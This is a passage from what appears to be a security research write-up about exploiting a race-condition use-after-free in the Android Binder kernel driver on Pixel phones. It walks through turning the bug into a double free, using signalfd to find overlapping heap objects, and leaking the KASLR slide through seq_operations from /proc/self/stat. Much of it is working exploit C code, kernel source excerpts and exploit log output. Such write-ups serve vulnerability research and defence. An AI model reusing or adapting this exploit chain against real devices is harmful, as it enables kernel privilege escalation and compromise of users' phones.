        <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">list</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">w</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="nl">BINDER_WORK_TRANSACTION</span><span class="p">:</span> <span class="p">{</span>
            <span class="k">struct</span> <span class="nc">binder_transaction</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>
            <span class="n">t</span> <span class="o">=</span> <span class="n">container_of</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">binder_transaction</span><span class="p">,</span> <span class="n">work</span><span class="p">);</span>
            <span class="n">binder_cleanup_transaction</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="s">"process died."</span><span class="p">,</span>
                           <span class="n">BR_DEAD_REPLY</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">BINDER_WORK_RETURN_ERROR</span><span class="p">:</span> <span class="p">{</span>
            <span class="k">struct</span> <span class="nc">binder_error</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">container_of</span><span class="p">(</span>
                    <span class="n">w</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">binder_error</span><span class="p">,</span> <span class="n">work</span><span class="p">);</span>
            <span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_DEAD_TRANSACTION</span><span class="p">,</span>
                <span class="s">"undelivered TRANSACTION_ERROR: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                <span class="n">e</span><span class="o">-&gt;</span><span class="n">cmd</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">BINDER_WORK_TRANSACTION_COMPLETE</span><span class="p">:</span> <span class="p">{</span>
            <span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_DEAD_TRANSACTION</span><span class="p">,</span>
                <span class="s">"undelivered TRANSACTION_COMPLETE</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">kfree</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
            <span class="n">binder_stats_deleted</span><span class="p">(</span><span class="n">BINDER_STAT_TRANSACTION_COMPLETE</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">BINDER_WORK_DEAD_BINDER_AND_CLEAR</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">BINDER_WORK_CLEAR_DEATH_NOTIFICATION</span><span class="p">:</span> <span class="p">{</span>
            <span class="k">struct</span> <span class="nc">binder_ref_death</span> <span class="o">*</span><span class="n">death</span><span class="p">;</span>
            <span class="n">death</span> <span class="o">=</span> <span class="n">container_of</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">binder_ref_death</span><span class="p">,</span> <span class="n">work</span><span class="p">);</span>
            <span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_DEAD_TRANSACTION</span><span class="p">,</span>
                <span class="s">"undelivered death notification, %016llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">death</span><span class="o">-&gt;</span><span class="n">cookie</span><span class="p">);</span>
            <span class="n">kfree</span><span class="p">(</span><span class="n">death</span><span class="p">);</span>
            <span class="n">binder_stats_deleted</span><span class="p">(</span><span class="n">BINDER_STAT_DEATH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="n">pr_err</span><span class="p">(</span><span class="s">"unexpected work type, %d, not freed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                   <span class="n">w</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>Looking at the code, every case will either output some log messages or free the <code>binder_work</code>, which means the only interesting strategy is to perform a second <code>free</code> on the use-after-freed object. A double free in the SLUB means that we will be able to allocate two objects at the same location, make them overlap and then use one object to modify the other. </p>
<p>Now, not all <code>free</code>s are the same, if our <code>binder_node</code> object is at the address <code>X</code>, then the <code>binder_work</code> struct dequeued is at <code>X+8</code> and:</p>
<ul>
<li><code>BINDER_WORK_TRANSACTION</code> will free <code>X</code></li>
<li><code>BINDER_WORK_TRANSACTION_COMPLETE</code>, <code>BINDER_WORK_DEAD_BINDER_AND_CLEAR</code> and <code>BINDER_WORK_CLEAR_DEATH_NOTIFICATION</code> will free <code>X+8</code></li>
</ul>
<p>For an object allocated at <code>X</code>, if you free it at <code>X+8</code>, the next allocation will also be at <code>X+8</code>. This can be an interesting primitive, since it gives:</p>
<ul>
<li>an alternative overlapping configuration (you can reach different offsets than with a <code>free</code> at <code>X</code>)</li>
<li>a potential way to reach the object adjacent to the one at <code>X</code> (e.g. allocating a <code>binder_node</code>, which is 128-byte long, at <code>X+8</code> will result in an out-of-band access of 8 bytes on the adjacent object).</li>
</ul>
<p>We did not use this strategy for this exploit and sticked with a regular double-free at <code>X</code> by setting <code>w-&gt;type</code> to <code>BINDER_WORK_TRANSACTION</code>. However this path requires a bit more work than the other three.</p>
<p>In <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2168"><code>binder_cleanup_transaction</code></a>, we control <code>t</code> with <code>sendmsg</code>'s control buffer and we want to reach the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2178"><code>binder_free_transaction</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_cleanup_transaction</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_transaction</span> <span class="o">*</span><span class="n">t</span><span class="p">,</span>
                       <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">reason</span><span class="p">,</span>
                       <span class="kt">uint32_t</span> <span class="n">error_code</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">target_node</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">TF_ONE_WAY</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">binder_send_failed_reply</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">error_code</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_DEAD_TRANSACTION</span><span class="p">,</span>
            <span class="s">"undelivered transaction %d, %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
            <span class="n">t</span><span class="o">-&gt;</span><span class="n">debug_id</span><span class="p">,</span> <span class="n">reason</span><span class="p">);</span>
        <span class="n">binder_free_transaction</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>The first conditions to meet are:</p>
<ol>
<li><code>t-&gt;buffer</code> has to point to valid kernel memory (e.g. <code>0xffffff8008000000</code> which is always allocated on a Pixel device)</li>
<li><code>TF_ONE_WAY</code> should be set in <code>t-&gt;flags</code></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_free_transaction</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_transaction</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">target_proc</span> <span class="o">=</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">to_proc</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">target_proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">binder_inner_proc_lock</span><span class="p">(</span><span class="n">target_proc</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">)</span>
            <span class="n">t</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">transaction</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">binder_inner_proc_unlock</span><span class="p">(</span><span class="n">target_proc</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/*</span>
<span class="cm">     * If the transaction has no target_proc, then</span>
<span class="cm">     * t-&gt;buffer-&gt;transaction has already been cleared.</span>
<span class="cm">     */</span>
    <span class="n">kfree</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="n">binder_stats_deleted</span><span class="p">(</span><span class="n">BINDER_STAT_TRANSACTION</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>In <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2087"><code>binder_free_transaction</code></a> the other condition that needs to be met before reaching <code>kfree</code> is:</p>
<ol>
<li><code>t-&gt;to_proc</code> should be <code>NULL</code></li>
</ol>
<p>With these requirements fulfilled, we can finally perform a double free at <code>X</code>.</p>
<h4 id="identifying-overlapping-objects">Identifying Overlapping Objects</h4>
<p>Right now, to continue the exploit and get code execution, we need a KASLR leak and an arbitrary kernel memory read/write. Executing kernel code directly by redirecting the execution flow is not an option since recent Pixel kernels use CFI.</p>
<ul>
<li>The KASLR leak can be obtained by reading a function pointer stored in a object. With two overlapping objects, we would need one object from which you can read a value and a second one with a function pointer that aligns with the first object's value.</li>
<li>The arbitrary kernel memory read/write is a bit more complexed and will be detailed in the following sections. For now, note that it relies on <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf"><code>Thomas King's "Kernel Space Mirroring Attack"</code></a>, or KSMA, and that we need an 8-byte write at the beginning of the overlapping objects.</li>
</ul>
<p>However, before we can do any of that, we need to identify where objects overlap in memory. Depending on the stage of the exploit we are at, we won't be overlapping the same objects. This means that we need to be able to free and allocate objects with enough precision as to not lose the reference to the dangling memory region.</p>
<p>It is very likely that different methods to detect overlapping objects can be used. For this exploit, we decided to reuse <code>signalfd</code> for this purpose. The idea is to give every <code>signalfd</code> a specific identification number through its <code>sigset_t</code> value during the first spray that gets the control of <code>w-&gt;type</code>.</p>
<p>In practice, if everything goes as planned, the exploit will start spraying with <code>sendmsg</code> and <code>signalfd</code>. Then, the use-after-free will occur. A <code>sendmsg</code>/<code>signalfd</code> object will replace the <code>binder_node</code> object and change the value of <code>w-&gt;type</code>. The double free will occur and allow for two objects to overlap. We keep spraying with <code>sendmsg</code>/<code>signalfd</code> to overlap the double freed <code>signalfd</code> with another. This will result in one <code>signalfd</code> having its value changed and with the identification number, it will be possible to determine which <code>signalfd</code> it is overlapping with.</p>
<p>The following figure summarizes this scenario:</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/signalfd_id.png"></p>
<h4 id="kaslr-leak">KASLR Leak</h4>
<p>In this section, we will leverage the two overlapping <code>signalfd</code>s to get a KASLR leak, which will become useful for our arbitrary kernel memory read/write primitive.</p>
<p>Now we need to find objects that, when overlapped, can give us a function pointer. <code>signalfd</code> is interesting enough to keep, since it offers the following capabilities:</p>
<ul>
<li>we can read an 8-byte value at its allocation address</li>
<li>we can write an almost arbitrary 8-byte value at its allocation address (bits 8 and 18 are always set when writing a value with <code>signalfd</code>)</li>
<li>it does not crash the system on corruption</li>
</ul>
<p>This can easily be paired with another object that has a function pointer in its first 8 bytes. A prime candidate for this would be <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/include/linux/seq_file.h#32"><code>struct seq_operations</code></a></p>
<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="nc">seq_operations</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">start</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">pos</span><span class="p">);</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">);</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">next</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">pos</span><span class="p">);</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">show</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>

<p><code>seq_operations</code> is allocated during a call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/seq_file.c#554"><code>single_open</code></a> which happens when certain files of the <code>/proc</code> filesystem are accessed. For this exploit, we will use <code>/proc/self/stat</code>.</p>
<p>This file is created in <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/proc/stat.c#200"><code>proc_stat_init</code></a> and the function <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/proc/stat.c#184"><code>stat_open</code></a> is called when the file is opened.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="n">proc_stat_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">proc_create</span><span class="p">(</span><span class="s">"stat"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">proc_stat_operations</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">fs_initcall</span><span class="p">(</span><span class="n">proc_stat_init</span><span class="p">);</span>

<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">file_operations</span> <span class="n">proc_stat_operations</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">open</span>       <span class="o">=</span> <span class="n">stat_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span>       <span class="o">=</span> <span class="n">seq_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">llseek</span>     <span class="o">=</span> <span class="n">seq_lseek</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span>    <span class="o">=</span> <span class="n">single_release</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">stat_open</span><span class="p">(</span><span class="k">struct</span> <span class="nc">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span> <span class="o">+</span> <span class="mi">128</span> <span class="o">*</span> <span class="n">num_online_cpus</span><span class="p">();</span>
    <span class="cm">/* minimum size to display an interrupt count : 2 bytes */</span>
    <span class="n">size</span> <span class="o">+=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">nr_irqs</span><span class="p">;</span>
    <span class="k">return</span> <span class="nf">single_open_size</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">show_stat</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>In <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/proc/stat.c#190"><code>stat_open</code></a> we can see a call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/seq_file.c#575"><code>single_open_size</code></a>, which will subsequently call <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/seq_file.c#582"><code>single_open</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">single_open_size</span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">show</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">),</span>
        <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">seq_buf_alloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">single_open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">show</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">kvfree</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">((</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="p">)</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="p">((</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="p">)</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/seq_file.c#554"><code>single_open</code></a> will make two allocations in the kmalloc-128 cache. The first is a <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/seq_file.c#557"><code>seq_operations</code></a> allocation, the one we're interested in, and the second is a <code>seq_file</code> allocation in <code>seq_open</code>. </p>
<p>This <code>seq_file</code> object is only allocated in the kmalloc-128 cache in <a href="https://android.googlesource.com/kernel/common/+/0965232035cfa59a64d197cf8a8ee0bc407bb3e4%5E%21/fs/seq_file.c">older versions of the kernel</a>, it now has its own dedicated cache. If the exploit happens on a kernel version prior to the <code>seq_file</code> cache addition, it's possible to get a <code>seq_file</code> allocation for the overlapped object when we actually want a <code>seq_operations</code>. In practice, we just need to retry and filter the results until we get the address we want with simple heuristics. This will be detailed further later in this section.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">single_open</span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">show</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">),</span>
        <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">seq_operations</span> <span class="o">*</span><span class="n">op</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">op</span><span class="p">),</span> <span class="n">GFP_KERNEL_ACCOUNT</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">op</span><span class="o">-&gt;</span><span class="n">start</span> <span class="o">=</span> <span class="n">single_start</span><span class="p">;</span>
        <span class="n">op</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">single_next</span><span class="p">;</span>
        <span class="n">op</span><span class="o">-&gt;</span><span class="n">stop</span> <span class="o">=</span> <span class="n">single_stop</span><span class="p">;</span>
        <span class="n">op</span><span class="o">-&gt;</span><span class="n">show</span> <span class="o">=</span> <span class="n">show</span><span class="p">;</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">seq_open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">op</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
            <span class="p">((</span><span class="k">struct</span> <span class="nc">seq_file</span> <span class="o">*</span><span class="p">)</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">private</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
        <span class="k">else</span>
            <span class="n">kfree</span><span class="p">(</span><span class="n">op</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>In <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/seq_file.c#561"><code>single_open</code></a>, <code>op-&gt;start</code> is set to <code>single_start</code>. Since <code>signalfd</code> allows to read the first 8-byte of the object we overlap, <code>single_start</code> will be the address of the function we will read to get a KASLR leak.</p>
<p>As explained earlier, it's possible to get a <code>seq_file</code> allocation (or maybe even an unrelated allocation by the system). In that case, it's possible to retry to allocated <code>seq_operations</code> until we can detect that it worked. A simple heuristic for this case is to subtract the <code>single_start</code> function kernel offset to the value read by <code>signalfd</code> and check that the sixteen least significant bits are zeroes:</p>
<div class="codehilite"><pre><span></span><code><span class="err">(kaslr_leak - single_start_offset) &amp; 0xffff == 0</span>
</code></pre></div>

<p>It's very unlikely that another allocation has a value that would meet this condition in its first 8 bytes.</p>
<p><strong>Note:</strong> It's possible to retrieve the offset of the <code>single_start</code> function on an Android device from <code>/proc/kallsyms</code>.</p>
<div class="codehilite"><pre><span></span><code>flame:/ <span class="c1"># sysctl -w kernel.kptr_restrict=0</span>
kernel.kptr_restrict <span class="o">=</span> <span class="m">0</span>

flame:/ <span class="c1"># grep -i -e " single_start$" -e " _head$" /proc/kallsyms</span>
ffffff886c080000 t _head
ffffff886dbcfd38 t single_start
</code></pre></div>

<p>By implementing this logic in a function similar to the one below, we can finally get our necessary KASLR leak and move on to the next step.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="n">proc_self</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

<span class="cm">/* Releasing the signalfd object that was corrupted by our overlapping one */</span>
<span class="k">if</span> <span class="p">(</span><span class="n">corrupt_fd</span><span class="p">)</span>
    <span class="n">close</span><span class="p">(</span><span class="n">corrupt_fd</span><span class="p">);</span>

<span class="cm">/* Checking the value read by the overlapping fd */</span>
<span class="kt">uint64_t</span> <span class="o">=</span> <span class="n">get_sigfd_sigmask</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">);</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Value @X after freeing `corrupt_fd`: 0x%lx"</span><span class="p">,</span> <span class="n">mask</span><span class="p">);</span>

<span class="cm">/* Allocating seq_operations objects so that it overlaps with our signalfd */</span>
<span class="nl">retry</span><span class="p">:</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_SEQ</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">seq_fd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">openat</span><span class="p">(</span><span class="n">proc_self</span><span class="p">,</span> <span class="s">"stat"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">seq_fd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not allocate seq ops (%d - %s)"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="p">}</span>

<span class="cm">/* Reading the value after spraying */</span>
<span class="n">mask</span> <span class="o">=</span> <span class="n">get_sigfd_sigmask</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">);</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Value @X after spraying seq ops: 0x%lx"</span><span class="p">,</span> <span class="n">mask</span><span class="p">);</span>

<span class="cm">/* Checking if the KASLR leak read meets the condition */</span>
<span class="n">kaslr_leak</span> <span class="o">=</span> <span class="n">mask</span> <span class="o">-</span> <span class="n">SINGLE_START</span><span class="p">;</span>
<span class="k">if</span> <span class="p">((</span><span class="n">kaslr_leak</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">debug_print</span><span class="p">(</span><span class="s">"Could not leak KASLR slide"</span><span class="p">);</span>

    <span class="cm">/* If not, we close all seq_fds are try again */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_SEQ</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">close</span><span class="p">(</span><span class="n">seq_fd</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">goto</span> <span class="n">retry</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/* If it works we display the KASLR leak */</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"KASLR slide: %lx"</span><span class="p">,</span> <span class="n">kaslr_leak</span><span class="p">);</span>
</code></pre></div>

<p>The result should be the following:</p>
<div class="codehilite"><pre><span></span><code><span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">371</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="k">Value</span> <span class="nv">@X</span> <span class="k">after</span> <span class="n">freeing</span> <span class="n n-Quoted">`corrupt_fd`</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">386</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="k">Value</span> <span class="nv">@X</span> <span class="k">after</span> <span class="n">spraying</span> <span class="n">seq</span> <span class="n">ops</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">394</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="n">Could</span> <span class="k">not</span> <span class="n">leak</span> <span class="n">KASLR</span> <span class="n">slide</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">386</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="k">Value</span> <span class="nv">@X</span> <span class="k">after</span> <span class="n">spraying</span> <span class="n">seq</span> <span class="n">ops</span><span class="o">:</span> <span class="mh">0x0</span>
